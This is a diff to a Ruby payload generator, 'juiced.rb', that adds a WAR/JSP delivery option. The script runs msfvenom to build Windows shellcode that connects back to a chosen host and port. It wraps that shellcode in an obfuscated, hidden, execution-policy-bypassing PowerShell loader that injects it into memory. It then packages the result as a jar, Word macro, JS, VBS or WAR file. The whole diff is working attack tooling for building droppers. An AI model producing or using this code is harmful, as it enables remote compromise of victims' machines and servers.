@@ -5,8 +5,8 @@ require 'io/console'
 require 'base64'
 def usage
 	puts "Usage: ruby juiced.rb MsfvenomPayload Lhost Lport payloadFlag PayloadName\n"
-	puts "Note: Payload name required for jar file, and is not required for other payloads." 
-	puts "Payload Options: jar, ps, macro, vbs, and js."
+	puts "Note: Payload name required for payloads that output a file." 
+	puts "Payload Options: jar, war, macro, ps, vbs, and js."
 end
 #######################################################################################################################
 #Payload Functions Begin
@@ -79,6 +79,35 @@ def gen_vbsFile(base64Command, fileName)
                 f.write(str)
         	end
 end
+def gen_warFile(base64Command, fileName)
+	#Creates the web.xml file to point to the .jsp servlet
+        File.open("web.xml", "w") do |f|
+                tempWebStr = <<-EOS1
+<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+"http://java.sun.com/dtd/web-app_2_3.dtd">
+<web-app>
+<servlet>
+<servlet-name>fileName</servlet-name>
+<jsp-file>/fileName.jsp</jsp-file>
+</servlet>
+</web-app>
+EOS1
+f.write(tempWebStr.to_s.gsub("fileName", fileName))
+	end
+        #Creates JSP file
+        File.open(fileName+".jsp", "w") do |f|
+                tempJspStr = <<-EOS2
+<%@ page import="java.io.*" %>
+<% 
+Process p=Runtime.getRuntime().exec("base64Command");
+%>
+		EOS2
+                f.write(tempJspStr.to_s.sub("base64Command", base64Command))
+	end
+	exec ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
+end
 ##################################################################################################################
 #Payload Functions End
 ##################################################################################################################
@@ -104,7 +133,7 @@ def generate_shellcode (payload, lhost, lport)
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
 	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
-	puts "Now running " +  command
+	puts "Now running" +  command
 	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
 	IO.popen(command) do |f|
 		sleep(5)
@@ -117,7 +146,6 @@ def generate_shellcode (payload, lhost, lport)
 end
 def gen_command(shellcode)
 	str = <<-EOS
-	#Modified PSH Shellcode output from msfvenom to support the x86 downgrade
 	$var = '$RgJTJokYRNwbHQ = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$JLOgmnlpEHlaQgk = Add-Type -memberDefinition $RgJTJokYRNwbHQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $xuigDWqpcchqI = shellcodehere;$cDPWgScbWjEED = $JLOgmnlpEHlaQgk::VirtualAlloc(0,[Math]::Max($xuigDWqpcchqI.Length,0x1000),0x3000,0x40);for ($OArfsQVSOrBoW=0;$OArfsQVSOrBoW -le ($xuigDWqpcchqI.Length-1);$OArfsQVSOrBoW++){$JLOgmnlpEHlaQgk::memset([IntPtr]($cDPWgScbWjEED.ToInt32()+$OArfsQVSOrBoW), $xuigDWqpcchqI[$OArfsQVSOrBoW], 1) | Out-Null};$JLOgmnlpEHlaQgk::CreateThread(0,0,$cDPWgScbWjEED,0,0,0);for (;;){Start-sleep 60};';$newVar = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($var));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -enc ";iex $cmd $newVar}else{iex "$var"};
 	EOS
 	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
@@ -131,23 +159,26 @@ if ARGV.empty?
 else
 	temp = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
 	#Call function to base64 encode everything and issue out powershell command
-	Command = gen_command(temp)
+	command = gen_command(temp)
 	#Case switch statement for different payload flags
 	case ARGV[3]
 	when "jar"
 		puts "Now creating file with .jar extension, please check local directory."
-		gen_jarFile(Command, ARGV[4])
+		gen_jarFile(command, ARGV[4])
 	when "ps"
-		puts gen_psCommand(Command)
+		puts gen_psCommand(command)
 	when "macro"
 		puts "Now creating Copy/Pastable Word Macro...."
-		gen_Macro(Command)
+		gen_Macro(command)
 	when "js"
 		puts "Now creating file with .js extension, please check local directory."
-		gen_jsFile(Command, ARGV[4])
+		gen_jsFile(command, ARGV[4])
 	when "vbs"
 		puts "Now creating file with .vbs extension, please check local directory."
-		gen_vbsFile(Command, ARGV[4])
+		gen_vbsFile(command, ARGV[4])
+	when "war"
+		puts "Now creating file with .war extension, please check local directory."
+		gen_warFile(command, ARGV[4])
 	else
 	puts "You forgot to specify a payload."
 	end
